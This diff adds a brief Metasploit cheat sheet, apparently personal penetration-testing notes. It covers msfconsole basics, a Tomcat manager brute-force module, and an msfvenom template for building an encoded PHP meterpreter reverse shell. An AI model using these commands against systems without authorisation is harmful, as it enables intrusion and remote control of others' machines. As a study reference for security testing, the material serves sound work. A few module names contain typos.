@@ -1,0 +1,25 @@
+######################### USEFUL METASPLOITABLE COMMANDS ######################################
+
+### BASIC USAGE
+1) msfconsole : starts metasploit console
+2) search <exploit name> (optional) : search for an exploit or brelated term from all modules ;eg -> search ssh
+3) use <module name> : eg -> use auxiliary/scanner/ssh/seh_version 
+4) show options : display available parameters
+5) set <option name> <option value> : set required options ; eg-> set RHOSTS 192.168.1.25
+6) set payload (optional)
+7) run : runs the exploit 
+
+
+### AUXILIARY MODULES
+1) auxiliary/scanner/ssh/ssh_version : get ssh version of target machine
+2) auxiliary/scanner/http/tomcat_mgr_login : apache tomcat login manager brute force
+
+### MSFVENOM
+# Usage : msfvenom -p <payload name> -e <encoder name> LHOST=<lsitener ip address> LPORT=<listening port> -f raw > <file out name>
+
+# MSFVENOM PAYLOADS
+1) php/meterpreter/reverse_tcp : php reverse meterpreter shell code injection
+
+
+# ENCODERS
+1) php/base64
